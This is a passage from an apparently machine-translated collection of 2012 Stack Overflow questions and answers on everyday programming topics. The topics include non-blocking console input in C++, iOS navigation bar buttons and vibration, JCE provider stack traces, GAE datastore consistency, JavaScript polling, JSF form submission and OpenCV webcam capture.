我不知道他们中的任何一个，所以我不确定我应该学习哪一个来获得目标。或者也许还有另一个更简单的解决方案？

操作系统：Unix

**编辑：** g-makulik 让我展示，为什么不可能使用线程坚持写，这是可能的，确实是这样，但我不认为这应该是这样的：

```
#include <pthread.h>
#include <iostream>
#include <string>
#include <stdio.h>

void* print_message_function(void *doPrint) {
    bool* vDoPrint = (bool*) doPrint;
    while (*vDoPrint) {
        sleep(0.5);
        std::cout << "Thread 1" << std::endl;
    }
    return NULL;
}

void* keyPressed(void* doPrint) {
    bool* vDoPrint = (bool*) doPrint;
    while (*vDoPrint) {
        *vDoPrint = (char) getchar() == 'k' ? false : true;
        std::cout << "THIS ISN'T DISPLAYED UNLESS 'k' PRESSED.";
    }
    return NULL;
}

int main(int argc, char* argv[]) {
    pthread_t thread1, thread2;
    int iret1, iret2;
    bool doPrint = true;
    iret2 = pthread_create(&thread2, NULL, print_message_function,
            (void*) &doPrint);
    iret1 = pthread_create(&thread1, NULL, keyPressed,
            (void*) &doPrint);

    pthread_join(thread1, NULL);
    pthread_join(thread2, NULL);

    std::cout << "Thread 1 returns: " << iret1 << std::endl;
    std::cout << "Thread 2 returns: " << iret2 << std::endl;
    return 0;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T18:38:07.530

可以等待一个线程的键盘输入，而另一个线程输出到同一个控制台。你只需要同步你的线程（输入/输出）来获得用户输入的功能（例如使用事件队列）。

**编辑：**在提供这些系统调用的系统上， 使用`select()`或使用超时而不是单独的线程可能是更好的选择。`epoll()`

ncurses 库将使您能够以类似窗口的方式组织控制台显示（例如，具有单独的面板来显示输出并具有某种命令（行）输入）。有关ncurses 能够做什么的高级示例，请参阅[午夜指挥官。](https://www.midnight-commander.org/)

但只要您不关心应用程序中回显输入的这种分离，输入和输出的简单线程分离就可以正常工作。

我不能告诉任何关于 SMFL 的信息，但这个库似乎支持图形级别的窗口而不是控制台。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T18:35:46.853

我之前使用过 ncurses，虽然下面的解决方案可能不是最漂亮的，但它应该可以工作。

Ncurses 允许您将输入置于“无延迟”模式。这使得`getch()`从输入中读取字符的 非阻塞，如果用户没有按下任何东西，它将立即返回 ERR。

您可以等待标准输入文件描述符以查看输入文件描述符是否已准备好读取。也就是说，`select()`或者`epoll()`你想要的任何东西。如果你必须每 2 秒做一次，你可以把那个时间放到`select()`或`epoll()`。如果你确实得到了按键，那么你可以决定你想用它做什么。

该解决方案不需要多线程。

我不了解 SFML，所以我不知道它是否会使这更容易。Ncurses 是一个 C 库，对于 C++ 应用程序可能方便也可能不方便。如果您安装了手册页，您可能可以直接查看任何 ncurses 函数的文档（例如，`man getch`）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T18:38:52.610

*SFML*是我以前从未听说过的东西。我不能说这是一个糟糕的选择，而是一个非常不受欢迎的选择，因此它很可能会导致您的程序的用户不得不为它安装它。我不会走那条路。

*ncurses*是一个非常常见且很好的解决方案，但我认为它对您的情况来说太复杂了。当您进行更复杂的文本 I/O 时，ncurses 非常方便，例如在屏幕上绘图、组装窗口、处理鼠标等。对于这样一个简单的应用程序，我认为它可能有点矫枉过正。另一方面，如果您想捕捉非常特定的按键（例如箭头键或其他不会导致文本输入的键）或处理鼠标，那么 ncurses 将帮助您。

另一个流行且轻量级的选择是*SDL*（及其 SDL_input 库）。与之前的解决方案不同，它完全是面向输入的。它将允许您以非阻塞方式非常详细地捕捉击键、鼠标点击和可能的其他输入事件。但是，您通常将 libsdl 安装为一个整体，虽然它很小，但我不确定您的应用程序的所有用户是否都会喜欢它。好吧，除非他们使用通常使用 SDL 的游戏。

最后，您可以自己实现这样一个简单的事情。如果您只关心 *nix（而不关心 Windows 等系统的可移植性），您可以设置`stdin`为非阻塞模式，并在主循环中使用重复的非阻塞读取来检查按键。如果您的应用程序在循环迭代之间的等待比实际处理更多，则最好使用它`select()`来处理延迟和等待输入。

我会避免仅出于这个原因引入线程，因为它们效率低下并且通常会引入比它们解决的问题更多的问题。如果非阻塞 I/O 可行，则永远不要使用线程阻塞 I/O。

# objective-c - UINavigationBar - 改变 UIBarButtonItem 的位置

> ID：12078593
> 
> 赞同：4
> 
> 时间：2012-08-22T17:43:15.713
> 
> 标签：objective-c, ios, uitoolbaritem

我在我的应用程序中使用 UINavigationController 及其栏。现在我想改变 leftBarButtonItem 和 rightBarButtonItem 的位置。我希望它们位于具有自定义宽度和高度的不同 x 和 y 位置。

但问题是，更改框架不会改变 barButtonItem 的任何内容。我现在不知道为什么，但框架总是被重置为其原始坐标。

这是我在 viewWillAppear 中调用的代码：

```
UINavigationItem *navItem = [[self.navigationBar items] lastObject];

UIView *rightview = [[UIView alloc] initWithFrame:CGRectMake(0,0,66,30)];
rightview.backgroundColor = [UIColor blueColor];

//add custom view
UIBarButtonItem *search = [[UIBarButtonItem alloc] initWithCustomView:rightview];
navItem.leftBarButtonItem = search; 
```

![这是结果](../Images/c323882a9004c041d2f7fde1a3424a4c.png)

视图不是从 0/0 开始，例如 x 位置在 0 的 5px insetead。

有关如何解决此问题的任何建议？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-04-27T21:37:21.100

这对我来说对 leftBarButtonItem 有用：如果您希望 UIBarButtonItem 精确显示在位置 (0, 0)，您可以创建一个 UIButton，将其框架设置为 (-5, 0, width, height)，假设偏移量为左 barbutton 项目是 (5, 0)，并将其放置在您设置为 leftBarButtonItem 的 UIView 中。

```
#import "UINavigationItem+CSAButtons.h"

@implementation UINavigationItem (CSAButtons)

- (void) makeLeftBarButtonWithTarget:(id)target action:(SEL)action {

    UIImage * imageNormal = [UIImage imageNamed:@"normal.png"]; 
    UIImage * imageHighlighted = [UIImage imageNamed:@"highlighted.png"]; 
    UIImage * imageDisabled = [UIImage imageNamed:@"disabled.png"]; 

    // create your button
    UIButton * button = [UIButton buttonWithType:UIButtonTypeCustom];
    button.exclusiveTouch = YES;
    [button addTarget:target action:action forControlEvents:UIControlEventTouchUpInside];
    [button setBackgroundImage:imageNormal forState:UIControlStateNormal];
    [button setBackgroundImage:imageHighlighted forState:UIControlStateHighlighted];
    [button setBackgroundImage:imageDisabled forState:UIControlStateDisabled];

    // set the frame of the button (better to grab actual offset of leftbarbuttonitem instead of magic numbers)
    button.frame = CGRectMake(-5.0, 0.0, imageNormal.size.width, imageNormal.size.height);
    UIView * view = [[UIView alloc] initWithFrame:CGRectMake(0, 0, imageNormal.size.width, imageNormal.size.height)];
    [view addSubview:button];

    // set the barbuttonitem to be the view
    UIBarButtonItem * barButtonItem = [[UIBarButtonItem alloc] initWithCustomView:view];
    self.leftBarButtonItem = barButtonItem;
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-22T17:57:08.083

我不认为您有能力移动 a`UIBarButtonItem`但您可以通过将该`UIView`元素作为子视图添加到导航栏（或`navItem`）来实现相同的效果。你需要玩一点。它应该允许更大的灵活性。

希望这可以帮助。

# webhooks - 如何使用 webhook 发布数据？

> ID：12078597
> 
> 赞同：2
> 
> 时间：2012-08-22T17:43:26.753
> 
> 标签：webhooks

我是使用 webhook 的新手。我想在 opencart 中实现 webhook。我有一系列数据，我想在服务器上发布，但我不知道如何做到这一点。在这方面的任何帮助都非常值得赞赏。谢谢

# iphone - 通过 IF Else 语句以编程方式使 iPhone 振动

> ID：12078601
> 
> 赞同：-3
> 
> 时间：2012-08-22T17:43:54.490
> 
> 标签：iphone, objective-c

> **可能的重复：**
> [使 iPhone 振动](https://stackoverflow.com/questions/4724980/making-the-iphone-vibrate)

我有两个按钮。一键加，一键减。问题是当我在文本区域中输入某个数字（例如 22）时，手机会振动一段时间。这是我的代码：

我想说的是如果标签显示“22”然后振动电话......问题是我该如何写这个......我还在学习，所以任何有关这方面的帮助将不胜感激！到目前为止，这是我的代码：

```
#import "StartCountViewController.h"
#import "AudioToolbox/AudioServices.h"

@implementation StartCountViewController

int Count=0;

-(void)awakeFromNib {

    startCount.text = @"0";

}

- (IBAction)addNumber {

    if(Count >= 999) return;

    NSString *numValue = [[NSString alloc] initWithFormat:@"%d", Count++];
    startCount.text = numValue;
    [numValue release];

}

- (IBAction)vibrate {

}
- (IBAction)subtractNumber {

    if(Count <= -35) return;

    NSString *numValue = [[NSString alloc] initWithFormat:@"%d", Count--];
    startCount.text = numValue;
    [numValue release]; 
}

- (void)didReceiveMemoryWarning {
    // Releases the view if it doesn't have a superview.
    [super didReceiveMemoryWarning];

    // Release any cached data, images, etc that aren't in use.
}

- (void)viewDidUnload {
    // Release any retained subviews of the main view.
    // e.g. self.myOutlet = nil;
}

- (void)dealloc {
    [super dealloc];
}

@end 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-23T03:58:19.030

这基本上是[Programmatically make the iPhone vibrate的副本](https://stackoverflow.com/questions/2080442/programmatically-make-the-iphone-vibrate)

话虽如此，我认为您的代码仍然会出现错误，并且语法似乎已被弃用。

这是一个例子。我没有在测试振动所需的实际 iphone 上尝试此操作，但如果您将*AudioToolbox 框架*添加到项目中，它应该可以工作，当然您的 XIB 文件具有必要的连接：

**视图控制器.h**

```
#import <UIKit/UIKit.h>

@interface ViewController : UIViewController
@property (retain, nonatomic) IBOutlet UILabel *numberLabel;
- (IBAction)addNumber:(id)sender;
- (IBAction)subtractNumber:(id)sender;
@end 
```

**视图控制器.m**

```
#import "ViewController.h"
#import "AudioToolbox/AudioServices.h"

@interface ViewController ()
{
  int count;
}
@end

@implementation ViewController
@synthesize numberLabel;

- (void)viewDidLoad
{
  count = 0;
  [self updateCount];
  [super viewDidLoad];
    // Do any additional setup after loading the view, typically from a nib.
}

- (void)viewDidUnload
{
  [self setNumberLabel:nil];
    [super viewDidUnload];
    // Release any retained subviews of the main view.
}

- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation
{
  return (interfaceOrientation != UIInterfaceOrientationPortraitUpsideDown);
}

- (void)dealloc 
{
  [numberLabel release];
  [super dealloc];
}

- (IBAction)addNumber:(id)sender 
{
  if(count >= 999) {
    return [self vibrate];
  }; // ignore numbers larger than 999
  count++;
  [self updateCount];
}

- (IBAction)subtractNumber:(id)sender 
{
  if(count <= -35) {
    return [self vibrate];
  }; // ignore numbers less than -35
  count--;
  [self updateCount];
}

-(void)updateCount 
{
  NSString *countStr = [[NSString alloc] initWithFormat:@"%d",count];
  [self.numberLabel setText:countStr];
  [countStr release];
}

-(void)vibrate 
{
  NSLog(@"I'm vibrating");
  AudioServicesPlaySystemSound(kSystemSoundID_Vibrate);
}
@end 
```

# java - Java Cryptography Providers - 奇怪的堆栈跟踪

> ID：12078602
> 
> 赞同：1
> 
> 时间：2012-08-22T17:43:55.023
> 
> 标签：java, cryptography, stack-trace, jvm-hotspot, nosuchproviderexception

在对一些加密代码进行故障排除时，我看到了一个奇怪的堆栈跟踪层次结构。我已经解决了原始问题，但对如何生成这样的堆栈跟踪感到好奇。任何人都可以启发我吗？

请注意，我不能逐字复制粘贴堆栈跟踪。我必须删除可能暴露专有代码的框架。

```
businesscode.BusinessException: Failed while generating session key
        at businesscode.businessthing.BusinessMethod(BusinessApp.java:NN)
        ... NN more
Caused by: java.security.NoSuchProviderException: JCE cannot authenticate the provider XXX
        at javax.crypto.SunJCE_b.a(DashoA13*..)
        at javax.crypto.KeyGenerator.getInstance(DashoA13*..)
        at businesslib.generateKey(BusinessLib.java:NN)
        ... NN more
Caused by: javax.util.jar.JarException: Cannot parse X.jar
        at javax.crypto.SunJCE_c.a(DashoA13*..)
        at javax.crypto.SunJCE_b.b(DashoA13*..)
        at javax.crypto.SunJCE_b.a(DashoA13*..)
        ... 25 more 
```

为什么**方法名称如 a 和 b (SunJCE_c.a, SunJCE_b.b)**和**文件/行信息为 DashoA13***？

Oracle Java 6 32 位，在 64 位 Linux 和 32 位 Windows 上运行。

这可能是因为某些信息不可用，可能是由于运行时优化？还是一些故意的混淆？杰尼？

导致这种情况的问题是第三方加密提供程序被错误地打包在 jar 文件中。

编辑：最初的问题`NoSuchProviderException: JCE cannot authenticate the provider...`（感谢 Siva 和 owlstead 让我想起签名的罐子 :)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T18:18:50.543

这里有几个选项（我假设在此之前签名确实验证了）：

1.  用于生成签名的证书/私钥现已过期；
2.  签名与较新版本的 Oracle Java 运行时不兼容；
3.  内容上的签名`.jar`被删除或内容/签名被更改。

至于奇怪的名字；这些名称是已使用代码混淆器混淆的类的名称。它们不是公共 API 的一部分，因此您没有理由知道其内容。它们包含验证签名的代码，因此与安全相关。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T18:17:20.223

不是椭圆调用签名（可变参数编号）吗？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T17:47:20.417

您的第三方加密提供商应签署所有 jar 文件，尤其是提供商 jar。SUN（现在是 oracle）应该信任该签名。

# .net - 需要将时间跨度 ADO.NET 数据列格式化为 AM/PM

> ID：12078603
> 
> 赞同：2
> 
> 时间：2012-08-22T17:43:59.330
> 
> 标签：.net, datetime, ado.net

我有一个 DataColulmn TimeSpan 类型的 DataTable。它在 SQL Server 查询中填充了一个时间列，并在屏幕上显示为 24 小时格式。我想使用表达式列将其显示为 12 小时格式 + 上午/下午，但无法做到。我尝试使用 convert to the column 来处理字符串，但它显示了一种奇怪的格式，例如 PT20H15（即 20:15 或 8:15 pm）。如果小时为一位或两位数，则时间和小时的位置会发生变化，如果小时为 00，则将其删除，字符串处理似乎太复杂了。我尝试仅比较“HourCol > 12”之类的列值，但这会引发关于将时间跨度与 int 进行比较的错误，因此我再次失败。有没有人有不同的建议？

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T17:46:18.597

> 它显示了一种奇怪的格式，例如 PT20H15

这根本不是一种奇怪的格式。它是一段时间内的 ISO-8601 格式，对于`TimeSpan`.

> 我想将其显示为 12 小时格式 + 上午/下午

这听起来像是您在`TimeSpan`“一天中的某个时间”使用 a，说实话，这远非理想。我知道这是`DateTime.TimeOfDay`给的，但这只是因为框架没有“仅限时间”类型，更糟糕的是运气。

> 有没有人有不同的建议？

你能有一个计算列，它基本上是一些固定日期（甚至`DateTime.Today`）+时间跨度值，并使用格式对其进行`hh:mm tt`格式化吗？（您是否可以自己手动覆盖 中的值`DataTable`，而不是使用计算表达式？）

另一种选择是更改您的 SQL 查询以转换为日期/时间值，而不是在`DataTable`.

# iphone - 具有多个文本字段的分组表视图

> ID：12078609
> 
> 赞同：0
> 
> 时间：2012-08-22T17:44:25.403
> 
> 标签：iphone, objective-c, ios, uitableview, uitextfield

我有一个包含 10 个部分的组表视图，每个部分有一个单元格，每个单元格里面都有一个文本字段。

当用户点击文本字段时，我将其父单元格滚动到底部，使其正好位于键盘上方。

每个文本字段都有一个“下一个”返回键，因此当用户点击它时，下一个文本字段（在下面的单元格中）应该是第一响应者。

问题是：
假设用户点击索引 5 处的单元格文本字段，这将使键盘弹出并且表格视图将滚动，因此该单元格将位于键盘正上方。
现在用户按下下一个按钮..
我想要发生的是让索引 6 处的单元格的文本字段成为第一响应者。
但是我如何获得这个文本字段？
如果我尝试获取单元格，`cellForRowAtIndexPath`我将得到零，因为单元格是不可见的..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T18:03:07.747

想到了两个解决方案：

1）你没有很多单元格，所以不要回收它们，在启动时创建它们并将它们放在一个可以轻松获取它们的数组中，然后，当 tablview 要求单元格时，你将它们从你的大批。

当您想进入下一个时，您同时告诉 tableview 滚动到某个位置或单元格，然后将单元格从数组中拉出，将其添加到带有一些屏幕外框架的视图中，这样就看不到了，并且使 textField 成为第一响应者（以保持键盘向上）。当 tableView 请求单元格时，您可能需要重置框架，或者同时重置框架并将其从视图中删除。如果您发现需要这样做，您可能需要尽快再次使其成为第一响应者（向主队列发送一个块，以便文本字段永远不会退出第一响应者。

2) 同样，当您想让单元格的 textField 成为第一响应者，并将其包含在可见单元格中时，您只需滚动并使其成为第一响应者。如果它不在 visibleCells 中，请创建一个单元格，将其添加到上面的视图中，按照上面的方式执行第一响应者的操作，当您被要求提供该单元格的索引时，提供该单元格，可能会重置框架。

我已经使用屏幕外文本字段来玩键盘的技巧（保持它，让它起来，等等 - 所以我知道这是有效的）。对我来说不太确定的是 textField 是否在视图中的技巧。

这让我想到了第三种方法。您在视图中放置了一个屏幕外的 UITextField。当你想切换，并且单元格还不可见（即创建）时，你告诉屏幕外 textField 是 firstReponder，然后跟踪 tableView 滚动，当它结束 textField 你想要的第一响应者现在是可见的，所以你可以在它上面传输（即设置）firstResponder，保持键盘向上。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T17:52:09.323

I do not know how you create your rows but you need to consider, that UITableView recycles the cells. That means that the text field could be theoretically the same as before, just the content changes.

So all you need to do is make sure you know the textfield that is positioned right above the keyboard. I would not be surprised if this will be created when the view enters and never actually changes.

Again, the table recycles the cells and their content holders only filling in the corresponding data for the row as you provide it.

If you post your code that creates and recycles the cells I could be more specific.

# google-app-engine - 具有多个实例的 Google App Engine 和数据复制

> ID：12078616
> 
> 赞同：1
> 
> 时间：2012-08-22T17:44:50.783
> 
> 标签：google-app-engine

我正在使用 Google App Engine 作为刚刚发布的 iOS 游戏的后端。

通过玩游戏的行为，玩家创建关卡，然后与他们的朋友和整个世界分享这些关卡。GAE 用于存储和检索这些级别。GAE 还管理玩家的高分，因为它们比 Game Center 可以处理的更复杂。

总的来说，GAE 工作得很好。我喜欢 GAE 如何在需要时启动新实例，而无需我不断监控负载。对于这个游戏，GAE 运行大约 10 个实例，每秒处理大约 8 个查询。

但是有一个小问题。

我注意到有时玩家会两次进入高分表。这应该是不可能的，因为我在提交新分数之前删除了任何旧分数（这是在对 GAE 的一次查询中完成的）。

经过一些测试和探索，似乎正在发生的事情是玩家将获得高分，而实例 1 处理旧分数的删除和新分数的添加。然后玩家得到一个新的高分，但这次实例 4 是处理请求的那个，它还不知道另一个分数。

以最快的速度，玩家可能需要 10 秒才能获得新的高分。据我了解，数据复制只需要 2 或 3 秒。

我在测试期间从未见过这个问题，因为负载很少导致 2 个实例启动。

这似乎是对正在发生的事情以及如何为每个实例存储数据的合理解释？

有没有办法保证在一个实例中添加、删除或更改的数据在另一个实例中可用？高分不是“关键任务”，所以我不太担心，但我想将 GAE 用于一些更复杂的情况，其中数据的一致性非常重要。

GAE 可以做到这一点，还是我应该寻找其他解决方案？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T18:38:20.630

可以保证数据在所有数据中心之间保持一致（强一致性）。您需要使用祖先查询来实现它。但是，这样做会限制您每秒可以实现多少次写入。目前限制为每秒 1 次写入。

如果写入限制对您来说太慢，另一种选择是添加缓存层。因此，您仍将使用最终一致性模型，但您会将这些结果与 memcache 中的结果混合。

有关详细信息，请参阅文档[Structuring for Strong Consistency](https://developers.google.com/appengine/docs/python/datastore/structuring_for_strong_consistency)。

# javascript - Javascript 循环到 DOM

> ID：12078617
> 
> 赞同：1
> 
> 时间：2012-08-22T17:45:01.547
> 
> 标签：javascript, dom

我每 5 秒执行一次以下代码，但内容一次显示为一个块，理想情况下它应该在每次循环时写入 DOM？那么数组中的每个值都应该有自己的 div 吗？

```
function newfunction() {
    var obj;
    var xmlhttp;
    if (window.XMLHttpRequest)
    {
        xmlhttp=new XMLHttpRequest();
    }
    else
    {
        xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
    }
    xmlhttp.onreadystatechange=function()
    {
        if (xmlhttp.readyState==4 && xmlhttp.status==200)
        {
            obj = JSON.parse(xmlhttp.responseText);

            for (var i = 0, n = obj.length; i < n; i++) {
                var divTag = document.createElement("div");
                divTag.id = "div" + i;
                divTag.innerHTML = obj[i];
                divTag.className+="nodeclass";
                document.getElementById("content").appendChild(divTag);
            }
        }
    }
    xmlhttp.open("GET","verify.php",true);
    xmlhttp.send();
}
window.onload=function() {
    newfunction();
    setInterval("newfunction()",5000);
} 
```

所以在页面加载时它会获得一些内容，然后它应该每 5 秒添加更多内容。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T17:56:40.953

我没有看到任何 setTimeout 或 setInterval，但我会这样做：

```
function processIt(obj, i) {
    var n = obj.length;
    if (i < n) {
        var divTag = document.createElement("div");
        divTag.id = "div" + i;
        divTag.innerHTML = obj[i];
        divTag.className+="nodeclass";
        document.getElementById("content").appendChild(divTag);
        setTimeout(function () {
            processIt(obj, ++i);
        }, 1000);
    }
}

var obj = document.getElementsByTagName("div"); // Or whatever "obj" is

processIt(obj, 0); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T17:58:33.447

Updated my answer as you just updated your snippet.. What does your JSON-object from verify.php look like? Is it an object or an array or simple strings?

```
function retrieveContent() {
    var arrayOfElements,
        xmlhttp;

    if (window.XMLHttpRequest)
    {
        xmlhttp=new XMLHttpRequest();
    }
    else
    {
        xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
    }

    xmlhttp.onreadystatechange=function()
    {
        if (xmlhttp.readyState==4 && xmlhttp.status==200)
        {
            arrayOfElements = JSON.parse(xmlhttp.responseText);
            insertElements(arrayOfElements);

            setTimeout(retrieveContent, 5 * 1000);
        }
    };

    xmlhttp.open("GET","verify.php",true);
    xmlhttp.send();
}

function insertElements(arrayOfElements) {
  var divTag,
      i,
      n;

  for (i = 0, n = arrayOfElements.length; i < n; i++) {
    divTag = document.createElement("div");
    divTag.id = "div" + i;
    divTag.innerHTML = obj[i];
    divTag.className+="nodeclass";
    document.getElementById("content").appendChild(divTag);
  }
}

window.onload=retrieveContent; 
```

[jsbin snippet](http://jsbin.com/ohipef/2/edit)

# javascript - Sortable Accordian - 如何最小化其宽度？

> ID：12078619
> 
> 赞同：0
> 
> 时间：2012-08-22T17:45:04.873
> 
> 标签：javascript, jquery, html, jquery-ui

我用 jQuery UI 制作了一个可排序的手风琴，它似乎填满了页面的整个宽度。

[http://jqueryui.com/demos/accordion/#sortable](http://jqueryui.com/demos/accordion/#sortable)

如何设置它以使其宽度最小化，使其与它拥有的最大组一样长。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T18:02:17.763

只需在该页面中为手风琴 id 或 ui-accordion 类添加 CSS 样式，如下所示。

为id添加宽度

```
#accordion{
   width:300px;
} 
```

或添加到 css 类

```
.ui-accordion{
    width:300px;
} 
```

在这我认为宽度为 300px

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T18:30:50.257

您引用的页面有一个指向手风琴的独立示例的链接，[http://jqueryui.com/demos/accordion/sortable.html](http://jqueryui.com/demos/accordion/sortable.html)，它也扩展为全宽。所以第一页在外部（在手风琴本身之外）限制了手风琴。要直接控制宽度和其他尺寸，请使用 CSS 设置元素样式

# c++ - 如何在 Qt 4.8 (C++) 中使用 Video4Linux2 (v4l2) 在 OpenCV 2.4 中捕获视频？

> ID：12078622
> 
> 赞同：1
> 
> 时间：2012-08-22T17:45:14.030
> 
> 标签：c++, linux, qt, opencv, v4l2

我有 Xubuntu 12.04。如我所见，我的网络摄像头不是由 Linux 版本的 OpenCV 2.4 提供的，因为在 Windows XP（在同一台机器上）代码

```
CvCapture* capture = cvCaptureFromCAM(0) 
```

不会返回 NULL，但在 Linux 中会。我尝试了许多参数（许多负数、许多正数和零）。

但其他应用程序可以在 Linux 中从我的网络摄像头捕获视频。

我尝试编译和运行[这段代码](http://linuxtv.org/downloads/v4l-dvb-apis/capture-example.html)，我认为它运行良好，因为我可以看到点，而且我还可以看到缓冲区的一些奇怪内容（使用 -o 键）。我认为，内容是框架，但我不明白如何使用它（例如，从中创建正确的 IplImage*）。

如何在 Qt 中从我的网络摄像头捕获视频以进行进一步的 OpnenCV 视频处理？

而且我还需要一次从多个 USB 和 IP 摄像机捕获视频。

该解决方案必须**免费用于商业用途**。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T17:56:58.847

您必须构建具有 v4l 支持的 OpenCV。看看这个[指南](http://www.ozbotz.org/opencv-installation/)。并确保在配置构建后你有这一行：

> V4L/V4L2：使用 libv4l

**更新：**经过一番谷歌搜索后，我发现这是一个错误。请参阅[此线程](http://opencv-users.1802565.n2.nabble.com/ubuntu-v4lv2-webcam-cvCaptureFromCAM-returns-NULL-td2497359.html)并尝试从第三篇文章中修复（使用`LD_PRELOAD`或添加`v4l1compat.so`到链接器）。

# java - 如何控制 JSF 表单提交？Primefaces 命令按钮

> ID：12078626
> 
> 赞同：-2
> 
> 时间：2012-08-22T17:45:26.567
> 
> 标签：java, jsf, jakarta-ee

我有以下表单，我只想用我的 p:commandButton 提交，但是，我在所有输入框中都收到了提交，我如何只在 p:commandButton 上提交表单？

```
<h:form>
            <p:panel header="Lista de Referências" id="panel">
                <h:panelGrid columns="2" cellpadding="5">

                    <h:outputLabel>Referência</h:outputLabel>
                    <p:inputText value="#{entradaProdutoController.referencia}" 
                                 onkeypress="if (event.keyCode == 13) {onchange(); return false; }"> 
                        <f:ajax event="change" 
                                render="textDescri" 
                                listener="#{entradaProdutoController.listener}"/> 
                    </p:inputText>

                    <h:outputLabel>Descrição</h:outputLabel>
                    <h:outputText id="textDescri" value="#{entradaProdutoController.replyWith}" /> 

                    <h:outputLabel>Quantidade</h:outputLabel>
                    <p:inputText size="5" value="#{entradaProdutoController.quantidade}" />

                </h:panelGrid>
            </p:panel>
            <p:commandButton value="Adicionar" update="printTable" actionListener="#{entradaProdutoController.addAction(event)}">
            </p:commandButton> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T17:50:41.040

我相信该`onchange()`方法会导致在按下 enter 时提交页面，如果您不希望这种行为尝试删除...

```
onkeypress="if (event.keyCode == 13) {onchange(); return false; }" 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-28T10:53:21.763

厌倦了上述建议而没有成功的结果，所以作为一种解决方法，这就是我正在做的，这可能不是最佳实践，但它有效（这样做的锤击方式）：

```
<?xml version='1.0' encoding='UTF-8' ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"
      xmlns:h="http://java.sun.com/jsf/html"
      xmlns:p="http://primefaces.org/ui"
      xmlns:f="http://java.sun.com/jsf/core"
      >
    <h:head>
        <title>Facelet Title</title>
    </h:head>
    <h:body>
        <h1>Adicionar Referências</h1>
        <h:form id="formID" onkeypress="if (event.keyCode == '13') {return false;}">
            <h:outputLabel>Referência</h:outputLabel>
            <h:inputText  id="referenciaLoookup" value="#{testController.referencia}"
                          onkeypress="if (event.keyCode == '13') {document.getElementById('formID:testeButton').click()}"
                          > 
            </h:inputText>

            <h:inputText value="#{testController.referencia}" 
                         onkeypress="if (event.keyCode == 13) { onchange(); return false; }">
                <f:ajax event="change" listener="#{testController.teste(event)}" />
            </h:inputText>

            <p:commandButton id="lookup" value="lookup"
                             actionListener="#{testController.listener(a)}"/>

            <p:commandButton id="adicionar" value="Adicionar" 
                             actionListener="#{testController.addAction(e)}">
            </p:commandButton>

            <p:commandButton id="testeButton" value="teste" style="visibility: hidden;"
                             actionListener="#{testController.teste(event)}"/>
        </h:form>
    </h:body>
</html> 
```

# jquery - 在 DOM 元素上调用 colorbox() 时应该如何表现？

> ID：12078632
> 
> 赞同：-4
> 
> 时间：2012-08-22T17:45:45.310
> 
> 标签：jquery, colorbox

我只使用了 $.colorbox() 函数来成功显示内容。

如果我有一个 id 为“test”的 div，我打电话

```
$('#test').colorbox() 
```

预期的行为是什么？

我希望它会在颜色框内显示“测试”div，但我从未见过这种情况发生。否则，在特定 DOM 元素上调用 colorbox() 的目的是什么？

我看到这种形式的 colorbox() 被称为“Ajax”。$(mySelector).colorbox() 用法是否假定 mySelector 是一个链接并使用该链接的 href 来执行 Ajax 调用，然后将返回内容插入到颜色框中？如果是这样，我从文档中不清楚。

我正在使用：

*   jQuery 1.6.4
*   彩盒 1.3.19

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T18:06:02.537

如果您参考示例页面：[http ://www.jacklmoore.com/colorbox/example1/](http://www.jacklmoore.com/colorbox/example1/)

...或查看文档：[http ://www.jacklmoore.com/colorbox](http://www.jacklmoore.com/colorbox)

...您可以看到选择器旨在表示要单击的项目。插件的行为取决于选择器是什么。

当您单击所说的 div 时，在没有任何参数的情况下调用`colorbox()`随机 div 将产生一个空的颜色框：http: [//jsfiddle.net/w6AqG/](http://jsfiddle.net/w6AqG/)

这大概是预期的行为。因为这是一个由第三方编写的 jQuery 插件，所以了解预期内容的唯一方法是阅读文档（同样是[http://www.jacklmoore.com/colorbox](http://www.jacklmoore.com/colorbox)），或者，向插件作者发送一个发邮件问问他。

我建议您按照示例进行操作。

使用内联元素的最小工作示例：

HTML

```
<a id="show_test" href="#test">Show the test div</a>
<div style="display:none;">
    <div id="test">This is a test</div>
</div> 
```

Javascript

```
$('#show_test').colorbox({inline:true}); 
```

试试看：http: [//jsfiddle.net/K8eSc/](http://jsfiddle.net/K8eSc/)

# android - Android 在 SMSmanager 中启动一个活动

> ID：12078634
> 
> 赞同：0
> 
> 时间：2012-08-22T17:45:50.267
> 
> 标签：android

我想问一下我是否可以从 SmsManager 开始一个活动，尤其是从 sendTextMessage() 或者我是否可以使用 context.sendBroadcast() 函数。当我尝试发送消息时，我想以某种方式发送自定义意图。

我能做点什么吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T17:52:45.040

对不起，但有点不清楚你实际上想要完成什么。sendTextMessage 只是发送一条短信。向该过程添加额外的意图或广播可以实现什么？

